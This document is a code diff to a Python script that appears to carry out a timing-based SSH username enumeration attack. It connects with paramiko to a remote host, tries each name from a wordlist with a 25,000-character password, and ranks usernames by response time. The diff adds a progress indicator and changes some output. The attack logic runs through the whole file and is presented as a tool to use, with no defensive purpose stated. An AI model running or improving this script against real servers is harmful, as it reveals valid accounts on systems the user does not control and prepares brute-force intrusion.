@@ -1,5 +1,6 @@
 import operator
 import time
+import sys
 from argparse import ArgumentParser
 
 import paramiko
@@ -18,7 +19,7 @@ parser.add_argument("-v", "--verbose", action="store_true",
 
 args = parser.parse_args()
 
-print(args)
+#print(args)
 
 p = 'A' * 25000
 res = {}
@@ -26,11 +27,18 @@ wordlist = args.wordlist
 ip = args.rhost
 verbose = args.verbose
 limit = int(args.count)
-
+ln = 1
+lines = sum(1 for line in open(wordlist))
 for user in open(wordlist):
     ssh = paramiko.SSHClient()
     starttime = time.clock()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    perc = (float(ln)/float(lines))*100
+    sys.stdout.write("\r%d%%" % perc)
+    sys.stdout.flush()
+
+
     try:
         ssh.connect(ip, username=user[0:-1],
                     password=p)
@@ -39,13 +47,17 @@ for user in open(wordlist):
     total = endtime - starttime
 
     res[user] = total
+    ln += 1
+
     if verbose:
-        print("%s %s" % (user[0:-1], total))
+        print("Eumerating: %s %s" % (user[0:-1], total))
 
 ressorted = sorted(res.items(), key=operator.itemgetter(1))
 
+print;
+
 c = 0
-print("\nSorted:\n")
+if verbose: print("\nSorted:\n")
 # print(c)
 # print(limit)
 for x, y in ressorted:
